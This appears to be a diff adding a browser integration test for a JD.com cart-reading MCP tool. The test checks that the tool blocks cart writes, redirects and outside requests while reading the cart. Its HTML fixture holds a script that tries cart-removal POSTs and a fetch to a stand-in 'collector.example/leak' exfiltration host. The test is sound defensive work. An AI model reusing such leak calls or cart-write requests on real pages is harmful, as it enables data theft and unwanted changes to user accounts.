@@ -11,12 +11,13 @@ from dataclasses import replace
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from unittest.mock import patch
 
-from playwright.async_api import Error, async_playwright
+from playwright.async_api import Error, Route, async_playwright
 
 from jd_taobao_mcp.browser import BrowserController, _LINKS_SCRIPT
 from jd_taobao_mcp.config import Settings
 from jd_taobao_mcp.extractors.detail import extract_product_detail
 from jd_taobao_mcp.extractors.search import extract_jd_search
+from jd_taobao_mcp.cart import CART_FUNCTION, JD_CART_URL, read_jd_cart
 
 
 @unittest.skipUnless(os.getenv("MCP_BROWSER_TESTS") == "1", "opt-in Chromium tests")
@@ -80,6 +81,83 @@ class BrowserIntegrationTests(unittest.IsolatedAsyncioTestCase):
         await self.page.set_content('<article><a href="https://item.jd.com/123.html">Mouse model 123</a> 5000 reviews</article>')
         items = await extract_jd_search(self.page, 1)
         self.assertIsNone(items[0]["price"])
+
+    async def test_cart_context_blocks_writes_redirects_and_cleans_up(self):
+        """Real Chromium reaches only the cart read, using a fully local HTTP fixture."""
+        from test_cart import fixture
+        visited = []
+        html = '''<script src="https://storage.360buyimg.com/redirect.js"></script>
+            <iframe src="https://order.jd.com/list"></iframe><script>
+            (async()=>{
+              await Promise.allSettled([
+                fetch('https://api.m.jd.com/api?functionId=pcCart_jc_cartRemove',{method:'POST'}),
+                fetch('https://api.m.jd.com/api?functionId=pcCart_jc_changeSkuNum',{method:'POST'}),
+                fetch('https://api.m.jd.com/api?functionId=pcCart_jc_cartCheckAll',{method:'POST'}),
+                fetch('https://collector.example/leak',{method:'POST'})
+              ]);
+              await fetch('https://api.m.jd.com/api?functionId=pcCart_jc_getCurrentCart',{method:'POST'});
+            })();</script>'''
+
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                visited.append(self.path)
+                if self.path == "/redirect":
+                    self.send_response(302)
+                    self.send_header("Location", "https://storage.360buyimg.com/escaped.js")
+                    self.end_headers()
+                    return
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                self.wfile.write(html.encode())
+
+            def do_POST(self):
+                visited.append(self.path)
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(json.dumps(fixture()).encode())
+
+            def log_message(self, *args):
+                pass
+
+        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        original_fetch = Route.fetch
+        fetched = []
+        mapping = {JD_CART_URL: "/cart", "https://storage.360buyimg.com/redirect.js": "/redirect",
+                   f"https://api.m.jd.com/api?functionId={CART_FUNCTION}": "/read"}
+
+        async def local_fetch(route, **kwargs):
+            fetched.append(route.request.url)
+            self.assertEqual(kwargs["max_redirects"], 0)
+            # Unexpected requests fail here; no real JD or third-party traffic can escape.
+            target = mapping[route.request.url]
+            return await original_fetch(route, url=f"http://127.0.0.1:{server.server_port}{target}", **kwargs)
+
+        try:
+            await self.page.set_content("<title>Original page</title>")
+            before = len(self.browser.contexts)
+            with patch.object(Route, "fetch", local_fetch):
+                data = await read_jd_cart(self.context, 50, 10000)
+            self.assertEqual(data["status"], "ok")
+            self.assertEqual(data["count"], 1)
+            self.assertEqual(set(fetched), set(mapping))
+            self.assertEqual(visited, ["/cart", "/redirect", "/read"])
+            self.assertEqual(len(self.browser.contexts), before)
+            self.assertEqual(await self.page.title(), "Original page")
+            self.assertNotIn("FAKE_", json.dumps(data))
+            # Missing cart requests must time out without leaving the private context alive.
+            html = "<title>No cart response</title>"
+            with patch.object(Route, "fetch", local_fetch):
+                data = await read_jd_cart(self.context, 50, 1000)
+            self.assertFalse(data["success"])
+            self.assertEqual(len(self.browser.contexts), before)
+        finally:
+            await asyncio.to_thread(server.shutdown)
+            server.server_close()
+            thread.join()
 
     async def test_real_dom_never_exports_input_or_anchor_text(self):
         await self.context.route("**/*", lambda route: route.abort())
